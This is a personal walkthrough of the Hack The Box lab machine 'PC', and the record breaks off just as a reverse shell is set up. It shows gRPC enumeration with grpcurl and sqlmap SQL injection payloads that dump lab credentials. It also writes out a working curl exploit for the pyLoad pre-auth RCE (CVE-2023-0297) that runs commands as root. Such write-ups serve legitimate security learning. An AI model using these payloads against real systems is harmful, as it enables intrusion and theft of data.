## RUSTCAN:

```Bash
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChKXbRHNGTarynUVI8hN9pa0L2IvoasvTgCN80atXySpKMerjyMlVhG9QrJr62jtGg4J39fqxW06LmUCWBa0IxGF0thl2JCw3zyCqq0y8+hHZk0S3Wk9IdNcvd2Idt7SBv7v7x+u/zuDEryDy8aiL1AoqU86YYyiZBl4d2J9HfrlhSBpwxInPjXTXcQHhLBU2a2NA4pDrE9TxVQNh75sq3+G9BdPDcwSx9Iz60oWlxiyLcoLxz7xNyBb3PiGT2lMDehJiWbKNEOb+JYp4jIs90QcDsZTXUh3thK4BDjYT+XMmUOvinEeDFmDpeLOH2M42Zob0LtqtpDhZC+dKQkYSLeVAov2dclhIpiG12IzUCgcf+8h8rgJLDdWjkw+flh3yYnQKiDYvVC+gwXZdFMay7Ht9ciTBVtDnXpWHVVBpv4C7efdGGDShWIVZCIsLboVC+zx1/RfiAI5/O7qJkJVOQgHH/2Y2xqD/PX4T6XOQz1wtBw1893ofX3DhVokvy+nM=
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPqhx1OUw1d98irA5Ii8PbhDG3KVbt59Om5InU2cjGNLHATQoSJZtm9DvtKZ+NRXNuQY/rARHH3BnnkiCSyWWJc=
|   256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBG1KtV14ibJtSel8BP4JJntNT3hYMtFkmOgOVtyzX/R
50051/tcp open  unknown syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service
```

Ok soteems like nothing interesting came out from first scan, it can be something bad with VPN profile but I will try to scan for UPD services and then eventually recreate a VPN profile.

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# nmap -sU --top-ports 1000 pc.htb -vv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 10:06 CEST
Initiating Ping Scan at 10:06
Scanning pc.htb (10.10.11.214) [4 ports]
Completed Ping Scan at 10:06, 0.14s elapsed (1 total hosts)
Initiating UDP Scan at 10:06
Scanning pc.htb (10.10.11.214) [1000 ports]
UDP Scan Timing: About 44.50% done; ETC: 10:07 (0:00:39 remaining)
Completed UDP Scan at 10:07, 66.78s elapsed (1000 total ports)
Nmap scan report for pc.htb (10.10.11.214)
Host is up, received echo-reply ttl 63 (0.065s latency).
Scanned at 2023-05-21 10:06:46 CEST for 67s
All 1000 scanned ports on pc.htb (10.10.11.214) are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 67.05 seconds
           Raw packets sent: 2036 (94.086KB) | Rcvd: 1 (28B)
```

Ok nothing, I will try to re-generate a new VPN profile and try again!

Spoiler: No it didn't helped!

* * *

## SSH - Port 22:

As usual SSH is not our initial vector and bruteforce will not be an intended way to exploit ths machine.

I will come back as soon I find any potential crednetial's set.

* * *

## Port 50051:

A Google search unveiled potentially what this is could be about, gRPC service, see here from Hyper-v: https://github.com/docker/for-win/issues/3171

Or same from AWS Fairgate: https://aws.amazon.com/blogs/opensource/containerize-and-deploy-a-grpc-application-on-aws-fargate/

And Aspnet Core: https://github.com/dotnet/aspnetcore/issues/9233

Ok here I many pointed on Forum is to let NC timeout and wait for error:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# nc 10.10.11.214 50051
?��?�� ?@Did not receive HTTP/2 settings before handshake timeout
```

And googling around seems like it's about Kubernetes?

https://stackoverflow.com/questions/61916817/kubernetes-unable-to-connect-to-the-server-net-http-tls-handshake-timeout

But after some test I guess this is not about Kubernetes since we can't see any pother open service related to Kubernetes I guess this is about gRPC together with Aspnet Core and I will try to follow this guide: https://learn.microsoft.com/en-us/aspnet/core/grpc/test-tools?view=aspnetcore-7.0

Now to try to interact with this service there are 3 alternatives:

1.  Postman App
2.  GRPC webgui: https://github.com/fullstorydev/grpcui
3.  gRPC Curl: https://github.com/fullstorydev/grpcurl

Starting with gRPC we can follow microsoft guide: https://learn.microsoft.com/en-us/aspnet/core/grpc/test-tools?view=aspnetcore-7.0#discover-services

We can starin enumeration by describing service:

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl pc.htb:50051 describe 
Failed to dial target host "pc.htb:50051": tls: first record does not look like a TLS handshake
```

Ok we have to bypass the TLS handshake

![e3e34cca6bf013f140584ed1d8163624.png](../../../_resources/e3e34cca6bf013f140584ed1d8163624.png)

And we can get more now with plaintext flag:

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -plaintext pc.htb:50051 describe
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}
```

Good the app is called SimpleApp and have several services registered withing the gRPC application. Now next step is to "describe" those services and see exactly what are they expecting as input to get an output:

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -plaintext pc.htb:50051 describe RegisterUserRequest 
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}
                                                                                                                                                              
                                                                                                                                                              
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -plaintext pc.htb:50051 describe LoginUserRequest   
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}

┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -plaintext pc.htb:50051 describe getInfoRequest 
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
```

Good and lastly we should be able to invoke those services with proper strings so we can register an user:  https://learn.microsoft.com/en-us/aspnet/core/grpc/test-tools?view=aspnetcore-7.0#call-grpc-services

Explanation:

```Bash
$ grpcurl -d '{ "<field>": "<value>" }' <ip>:<port> <service_app>/<method>
{
  "message": "Hello World"
}

//Example
service_app=SimpleApp
method=getInfo
field(part of method)=id 
value=whatever you want
```

And trying the service "getInfo" with plaintext(insecure TLS) and we are moving forward:

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -d '{ "id": "text" }' -plaintext pc.htb:50051 SimpleApp/getInfo
{
  "message": "Authorization Error.Missing 'token' header"
}
```

Ok we know we have to register a new user, login and then we can use GetInfo.

Let's start by registering a new username:

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -d '{"username":"yovecio","password":"Coglione1"}' -plaintext pc.htb:50051 SimpleApp/RegisterUser 
{
  "message": "Account created for user yovecio!"
}
```

Good and next we will login with our username so we can grab the token:

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -d '{"username":"yovecio","password":"Coglione1"}' -plaintext pc.htb:50051 SimpleApp/LoginUser   
{
  "message": "Your id is 193."
}
```

Good we got our ID, now I guess we could exploit the getinfo?

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -d '{"id":"193"}' -plaintext pc.htb:50051 SimpleApp/getInfo  
{
  "message": "Authorization Error.Missing 'token' header"
}
                                                                                                                                                              
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -d '{"id":"1"}' -plaintext pc.htb:50051 SimpleApp/getInfo
{
  "message": "Authorization Error.Missing 'token' header"
}
```

Ok we need a header, I guess we have to user postman then... And doing so we got the token:

![52f318f4a4c2e5a364d1d3bb45944bbd.png](../../../_resources/52f318f4a4c2e5a364d1d3bb45944bbd.png)

Now I guess we have to add that token to our request and edit the id to match the 1? or other..

I will redo everything so i can get the token:

```Bash
//Register account
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -d '{"username":"yovecio","password":"Coglione1!"}' -plaintext -vv pc.htb:50051 SimpleApp/RegisterUser

Resolved method descriptor:
rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 35 bytes

Response contents:
{
  "message": "Account created for user yovecio!"
}

Response trailers received:
(empty)
Sent 1 request and received 1 response



//Login and grab the token
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -d '{"username":"yovecio","password":"Coglione1!"}' -plaintext -vv pc.htb:50051 SimpleApp/LoginUser   

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 16 bytes

Response contents:
{
  "message": "Your id is 29."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoieW92ZWNpbyIsImV4cCI6MTY4NDY3NTE3Nn0.wGspb8foPh6niD2jylZ3Kb4lHmuIq5q-k3syU5GIwIU'
Sent 1 request and received 1 response
```

And lastly we should ship the token in the header when we request the getInfo:

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -d '{"id":"1"}' -plaintext -vv -rpc-header 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoieW92ZWNpbyIsImV4cCI6MTY4NDY3NTY1OX0.519P9IDBC8B2NCoA-AHFnrsiOvntwdOaRPRItYKMS28' pc.htb:50051 SimpleApp/getInfo 

Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoieW92ZWNpbyIsImV4cCI6MTY4NDY3NTY1OX0.519P9IDBC8B2NCoA-AHFnrsiOvntwdOaRPRItYKMS28

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 46 bytes

Response contents:
{
  "message": "The admin is working hard to fix the issues."
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

Ok we have something now by sending the token:&lt;token&gt; in header-reauest. Now i guess we have to brute thru all the id to find some crendetials... here i tried several request with differnt IDs but it didn't worked out so I guess if that response from ID:1 is the tips to move forward aka create a admin username and then login?

And Indeed trying admin:admin it worked!

![c09af4f84d9c91e16cd2f4695286deea.png](../../../_resources/c09af4f84d9c91e16cd2f4695286deea.png)

Now copy the token and send another request but this time as admin but trying again 1 didn't worked and then I guessed to point to out id got from loggin in as admin:

![cea268d5d87cfc72bd07325d1f5ef049.png](../../../_resources/cea268d5d87cfc72bd07325d1f5ef049.png)

Ok wondering if this can be our password? Spoiler: NO!

Everithing I tried didn't worked but then i forgon to check the other service aka reflector:

```bash
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}


//describe the method
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -plaintext pc.htb:50051 describe .grpc.reflection.v1alpha.ServerReflectionRequest
grpc.reflection.v1alpha.ServerReflectionRequest is a message:
message ServerReflectionRequest {
  string host = 1;
  oneof message_request {
    string file_by_filename = 3;
    string file_containing_symbol = 4;
    .grpc.reflection.v1alpha.ExtensionRequest file_containing_extension = 5;
    string all_extension_numbers_of_type = 6;
    string list_services = 7;
  }
}
```

Ok we can list all the services on the backend:

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# ./grpcurl -plaintext -d '{"list_services": "1"}' pc.htb:50051 grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo
{
  "list_services_response": {
    "service": [
      {
        "name": "SimpleApp"
      },
      {
        "name": "grpc.reflection.v1alpha.ServerReflection"
      }
    ]
  }
}
```

Tjen trying to invoke an error on the getinfo as admin we got what I could understand what is the backend on the machine: ![1d969bccf57a64e9ee8373b62ba09243.png](../../../_resources/1d969bccf57a64e9ee8373b62ba09243.png)

The trying to play around seems like SQLi is the way to go:

![93f9d741be155eb5f1f50923752c1064.png](../../../_resources/93f9d741be155eb5f1f50923752c1064.png)

![3d7829b948e61631613feca4f81a955e.png](../../../_resources/3d7829b948e61631613feca4f81a955e.png)

But then I had an idea to spinup the gRPC webgui(acting as a HTTP proxy server) as I did untill now, then catch a burp request from the included browser:

![a1b73ea33adb3e6ee863d99b583989b1.png](../../../_resources/a1b73ea33adb3e6ee863d99b583989b1.png)

Then saving this as requqest and sending it to burp seems like it made it work:

```Bash
//part of code will be removed for space commodity
┌──(root㉿kali-linux)-[~/go/bin]
└─# sqlmap -r /home/millycash/Downloads/request.req --dbs --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:44:28 /2023-05-21/

[17:44:28] [INFO] parsing HTTP request from '/home/millycash/Downloads/request.req'

[17:44:42] [INFO] (custom) POST parameter 'JSON id' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
[17:44:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:44:42] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:44:42] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:44:42] [INFO] target URL appears to have 1 column in query
[17:44:43] [INFO] (custom) POST parameter 'JSON id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 193 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2OTM3NzN9.dCEkh27o3G7A_Rgyxfq3KZ8Y2Q02RhJt0-jx_TetcO4"}],"data":[{"id":"227 AND 6897=6897"}]}

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2OTM3NzN9.dCEkh27o3G7A_Rgyxfq3KZ8Y2Q02RhJt0-jx_TetcO4"}],"data":[{"id":"227 AND 4975=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2OTM3NzN9.dCEkh27o3G7A_Rgyxfq3KZ8Y2Q02RhJt0-jx_TetcO4"}],"data":[{"id":"-8072 UNION ALL SELECT CHAR(113,98,122,120,113)||CHAR(80,86,98,106,120,69,88,72,111,70,74,68,90,87,103,108,72,109,115,102,110,115,80,77,97,84,106,77,105,97,121,110,114,101,110,115,112,67,112,110)||CHAR(113,113,120,118,113)-- Dsox"}]}
---
[17:44:43] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[17:44:43] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[17:44:43] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 17:44:43 /2023-05-21/
```

Nice ok, we can't use DBS with SQLITE but what about --tables then?

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# sqlmap -r /home/millycash/Downloads/request.req --tables --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:49:23 /2023-05-21/

[17:49:23] [INFO] parsing HTTP request from '/home/millycash/Downloads/request.req'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[17:49:23] [INFO] resuming back-end DBMS 'sqlite' 
[17:49:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2OTM3NzN9.dCEkh27o3G7A_Rgyxfq3KZ8Y2Q02RhJt0-jx_TetcO4"}],"data":[{"id":"227 AND 6897=6897"}]}

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2OTM3NzN9.dCEkh27o3G7A_Rgyxfq3KZ8Y2Q02RhJt0-jx_TetcO4"}],"data":[{"id":"227 AND 4975=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2OTM3NzN9.dCEkh27o3G7A_Rgyxfq3KZ8Y2Q02RhJt0-jx_TetcO4"}],"data":[{"id":"-8072 UNION ALL SELECT CHAR(113,98,122,120,113)||CHAR(80,86,98,106,120,69,88,72,111,70,74,68,90,87,103,108,72,109,115,102,110,115,80,77,97,84,106,77,105,97,121,110,114,101,110,115,112,67,112,110)||CHAR(113,113,120,118,113)-- Dsox"}]}
---
[17:49:23] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[17:49:23] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[2 tables]
+----------+
| accounts |
| messages |
+----------+

[17:49:23] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 17:49:23 /2023-05-21/
```

And finally we may have credentials!

```Bash
┌──(root㉿kali-linux)-[~/go/bin]
└─# sqlmap -r /home/millycash/Downloads/request.req -T accounts --batch --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:50:07 /2023-05-21/

[17:50:07] [INFO] parsing HTTP request from '/home/millycash/Downloads/request.req'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[17:50:07] [INFO] resuming back-end DBMS 'sqlite' 
[17:50:07] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2OTM3NzN9.dCEkh27o3G7A_Rgyxfq3KZ8Y2Q02RhJt0-jx_TetcO4"}],"data":[{"id":"227 AND 6897=6897"}]}

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2OTM3NzN9.dCEkh27o3G7A_Rgyxfq3KZ8Y2Q02RhJt0-jx_TetcO4"}],"data":[{"id":"227 AND 4975=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2OTM3NzN9.dCEkh27o3G7A_Rgyxfq3KZ8Y2Q02RhJt0-jx_TetcO4"}],"data":[{"id":"-8072 UNION ALL SELECT CHAR(113,98,122,120,113)||CHAR(80,86,98,106,120,69,88,72,111,70,74,68,90,87,103,108,72,109,115,102,110,115,80,77,97,84,106,77,105,97,121,110,114,101,110,115,112,67,112,110)||CHAR(113,113,120,118,113)-- Dsox"}]}
---
[17:50:08] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[17:50:08] [INFO] fetching columns for table 'accounts' 
[17:50:08] [INFO] fetching entries for table 'accounts'
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+

[17:50:08] [INFO] table 'SQLite_masterdb.accounts' dumped to CSV file '/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv'
[17:50:08] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 17:50:08 /2023-05-21/
```

* * *

## Road to Local.txt:

If we try to use that credentials found in the Sqlmap:

![328f5d6d5276d6b82c168b3a9ec762dc.png](../../../_resources/328f5d6d5276d6b82c168b3a9ec762dc.png)

Nice we have our first flag!

* * *

## Road to Root.txt:

Now first thing first I tried to check for sudoes but sau have no sudo permissions allowed. Checked for other users and no one available except root; lastly os version is Ubuntu Focal fossa.

To make my life easier I will upload Linpeas and run thru all the available stuff and report here:

```Bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31

root        1026  0.0  0.8 635120 32052 ?        Ssl  May20   1:13 /usr/bin/python3 /opt/app/app.py


╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user
Proc 529 with ppid 1 is run by user systemd-network but the ppid user is root
Proc 808 with ppid 1 is run by user messagebus but the ppid user is root
Proc 817 with ppid 1 is run by user syslog but the ppid user is root
Proc 983 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 1055 with ppid 1 is run by user daemon but the ppid user is root
Proc 3388 with ppid 1 is run by user sau but the ppid user is root
Proc 22841 with ppid 1 is run by user sau but the ppid user is root
Proc 22859 with ppid 1 is run by user sau but the ppid user is root
Proc 33905 with ppid 1 is run by user uuidd but the ppid user is root
Proc 83592 with ppid 83507 is run by user sau but the ppid user is root
Proc 83788 with ppid 83679 is run by user sau but the ppid user is root


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::50051                :::*                    LISTEN      -    

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root root 4096 Jan 11 17:04 .
drwxr-xr-x 21 root root 4096 Apr 27 15:23 ..
drwxr-xr-x  3 root root 4096 May 21 15:42 app

╔══════════╣ Unexpected in root
/data
/vagrant
```

Here I see only 2 interesting stuff, one is the app folder under opt and the other one is those open ports on the inside...

Starting by that /opt/app I checked those files and seems like they are the python code for gRPC applications, and having already dumped the DB nothing came out of it so i guess is not the way to go. Checking with pspy64 we can see that app.py gets called by some cronjobs but except that we don't have writer permissions to rewrite those python files.

Then moving on i guess we can try to pivot those port 8000 and 9666 and check what can we see?

```Bash
sau@pc:/opt/app$ curl 127.0.0.1:8000
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F</a>. If not, click the link.
sau@pc:/opt/app$ 
sau@pc:/opt/app$ 
sau@pc:/opt/app$ curl 127.0.0.1:9666
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F">/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F</a>. If not, click the link.
sau@pc:/opt/app$
```

Forwarding port 8000:

```Bash
┌──(root㉿kali-linux)-[~millycash/Downloads/Tools]
└─# ssh -L 8000:127.0.0.1:8000 sau@pc.htb
sau@pc.htb's password: 
Last login: Sun May 21 16:29:24 2023 from 10.10.14.6
sau@pc:~$
```

![c3b3d72edd841ca5c44bb2149d2103d8.png](../../../_resources/c3b3d72edd841ca5c44bb2149d2103d8.png)

Ok seems like both 8000 and 9666 points to pyLoad.

Now googling around the service I guess maybe this can be helpfull to us?

[https://github.com/bAuh0lz/CVE-2023-0297\\\_Pre-auth\\\_RCE\\\_in\\\_pyLoad](https://github.com/bAuh0lz/CVE-2023-0297%5C_Pre-auth%5C_RCE%5C_in%5C_pyLoad)

Now I guess this should help us:

![312deccce13a88ba5428f3eb3973ef9d.png](../../../_resources/312deccce13a88ba5428f3eb3973ef9d.png)

And running the command:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/yovecio\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://localhost:8000/flash/addcrypted2'
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Sun, 21 May 2023 16:45:51 GMT
Server: Cheroot/8.6.0

Could not decrypt key
```

Seems like it executed some code as Root on the machine(we tried to save a file /tmp/yovecio) and we can see that root is the owner:

```Bash
sau@pc:/tmp$ ll
total 2032
drwxrwxrwt 15 root root    4096 May 21 16:45 ./
drwxr-xr-x 21 root root    4096 Apr 27 15:23 ../
drwxrwxrwt  2 root root    4096 May 20 19:00 .ICE-unix/
drwxrwxrwt  2 root root    4096 May 20 19:00 .Test-unix/
drwxrwxrwt  2 root root    4096 May 20 19:00 .X11-unix/
drwxrwxrwt  2 root root    4096 May 20 19:00 .XIM-unix/
drwxrwxrwt  2 root root    4096 May 20 19:00 .font-unix/
-rwxr-xr-x  1 sau  sau  1183448 May 21 15:37 bash*
-rwxrwxr-x  1 sau  sau   835306 May 21 04:26 linpeas.sh*
-rw-r--r--  1 root root       0 May 21 15:23 pwnd
-rw-r--r--  1 root root       0 May 21 15:36 pwnd1
drwxr-xr-x  4 root root    4096 May 20 19:00 pyLoad/
drwx------  3 root root    4096 May 20 19:00 snap-private-tmp/
drwx------  3 root root    4096 May 20 19:00 systemd-private-7034f969776d4306948e9c7a1838e0f1-ModemManager.service-gaFbWe/
drwx------  3 root root    4096 May 20 19:00 systemd-private-7034f969776d4306948e9c7a1838e0f1-systemd-logind.service-zVQhJi/
drwx------  3 root root    4096 May 20 19:00 systemd-private-7034f969776d4306948e9c7a1838e0f1-systemd-resolved.service-tUm3ff/
-rw-r--r--  1 root root       0 May 21 16:14 test
drwx------  2 root root    4096 May 20 19:00 tmpwotxugs8/
drwx------  2 sau  sau     4096 May 21 14:27 tmux-1001/
drwx------  2 root root    4096 May 20 19:00 vmware-root_737-4257003961/
-rw-r--r--  1 root root       0 May 21 16:45 yovecio
```

Now I guess we have to run a Revshell in it and it should spawn a session in our NC.

First i setup a NC listening:

![5605c8bacf650c9b1788790fc71c30ac.png](../../../_resources/5605c8bacf650c9b1788790fc71c30ac.png)

Then I find a revshell code and send it thru the script:

```Bash
